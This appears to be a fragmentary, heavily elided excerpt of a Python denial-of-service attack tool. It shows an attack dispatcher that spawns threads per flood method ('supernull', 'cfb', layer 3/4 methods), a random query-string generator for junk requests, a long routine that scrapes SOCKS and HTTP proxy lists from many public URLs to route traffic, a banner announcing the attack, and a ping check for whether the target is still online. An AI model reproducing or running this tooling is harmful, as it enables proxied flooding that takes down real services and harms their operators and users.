...
def start_attack(method, threads, event, socks_type):
    ...
    if (cmethod != "HIT") and (cmethod not in l4) and (cmethod not in l3) and (cmethod != "OSTRESS"):
        ...
        ########   #######   ######        ##  ########   #######   ######
        			...
        			Seconds: {}
        				...
        				""".format(target, method, len(proxies), sys.argv[7]))
    else:
    ...
    try:
        ...
        elif method == "supernull":
            for _ in range(threads):
                threading.Thread(target=supernull, args=(event, socks_type), daemon=True).start()
        elif method == "cfb":
            for _ in range(threads):
...
def random_data():
    return str(Choice(strings) + "=" + str(Intn(0, 271400281257)) + "&" + Choice(strings) + "=" + str(Intn(0, 271004281257)) + "&" + Choice(
        ...
        strings) + "&" + Choice(strings) + "=" + str(Intn(0, 3714081257)) + "&" + Choice(strings) + "=" + str(Intn(0, 271400281257)) + "&" + Choice(strings) + "=" + str(Intn(0, 271004281257)) + "&" + Choice(
        strings) + "=" + Choice(strings) + "&" + str(Intn(0, 271400281257)) + "=" + Choice(strings) + "&" + str(Intn(0, 271004281257)) + "=" + Choice(
        strings) + "&" + Choice(strings) + "=" + str(Intn(0, 3714081257)))
...
def supernull(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("null")
...
def downloadsocks(choice):
    ...
    if choice == "4":
        ...
        try:
            ...
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=socks4", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            ...
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", timeout=1)
            f.write(r.content)
            f.close()
        except:
            f.close()
        try:
            ...
            req = requests.get("https://www.socks-proxy.net/", timeout=1, headers={"User-Agent", UserAgent}).text
            part = str(req)
    ...
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=socks5", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roma8ok/proxy-list/main/proxy-list-socks5.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mcburn777/w0rksocks5/main/socks5.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", timeout=1)
            f.write(r.content)
            f.close()
        except:
            f.close()
    if choice == "1":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=http", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=https", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roma8ok/proxy-list/main/proxy-list-http.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roma8ok/proxy-list/main/proxy-list-https.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http%2Bhttps.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mcburn777/pr0xw0rk/main/http.txt", timeout=1)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=1)
            f.write(r.content)
            f.close()
        except:
            f.close()
...
def proxydl(out_file, socks_type):
    ...
    WAIT A MINUTE BEFORE THE ATTACK BEGINS""")
...
def piger(siye):
    if str("https") in str(siye):
        ...
        domain = str(siye)
    print('please wait ...')
    r = pig(domain, count=1, interval=0.2)
    if r.is_alive:
        die = "ONLINE"
    else:
        die = "OFFLINE"
